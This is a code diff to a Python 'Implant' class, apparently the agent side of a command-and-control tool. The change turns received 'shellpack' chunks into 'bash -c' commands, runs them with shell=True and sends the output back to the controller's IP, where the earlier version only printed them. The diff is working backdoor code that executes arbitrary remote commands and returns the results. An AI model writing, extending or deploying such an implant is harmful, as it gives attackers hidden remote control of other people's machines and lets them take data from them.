@@ -20,7 +20,7 @@ class Implant(Host):
     def __init__(self, controller_ip):
         super().__init__()
         self.controller_ip = controller_ip
-        self.module_cache = ""
+        self.module_cache = "bash -c \""
         
 
     def join(self, shellpack):
@@ -35,15 +35,17 @@ class Implant(Host):
             self.module_cache += shellpack['data'].decode()
         elif shellpack['option'] == "COMPLETE":
             self.module_cache += shellpack['data'].decode()
-            print(self.module_cache)
-            self.module_cahce = ""
+            self.module_cache += "\""
+            self.run_command(self.module_cache)
+            self.module_cache = "bash -c \""
         else:
-            print(shellpack['data'].decode())
+            self.module_cache += shellpack['data'].decode()
+            self.module_cache += "\""
+            self.run_command(self.module_cache)
+            self.module_cache = "bash -c \""
 
-    def instruction(self, shellpack):
+    def run_command(self, cmd):
         try:
-            cmd = shellpack['data'].decode()
-
             output = check_output(cmd, stderr=STDOUT, timeout=3, shell=True)
             self.send(self.controller_ip, "instruction", output)
             
@@ -51,6 +53,9 @@ class Implant(Host):
             self.send(self.controller_ip, "instruction", b'The command has timed out', option="ERROR")
         except Exception:
             self.send(self.controller_ip, "instruction", b'There was an error with the command', option="ERROR")
+
+    def instruction(self, shellpack):
+        self.run_command(shellpack['data'].decode())
 
 if __name__ == "__main__":
     print("[ Setting up implant... ]")
